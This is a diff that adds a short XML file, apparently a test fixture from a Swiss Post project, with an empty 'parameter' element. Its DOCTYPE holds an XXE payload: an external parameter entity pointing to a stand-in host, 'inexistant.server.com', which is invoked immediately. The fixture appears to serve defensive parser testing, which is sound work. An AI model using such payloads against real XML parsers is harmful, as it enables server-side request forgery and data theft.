@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  ~ (c) Copyright 2025 Swiss Post Ltd.
+  -->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://inexistant.server.com"> %xxe;]>
+<parameter xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+</parameter>
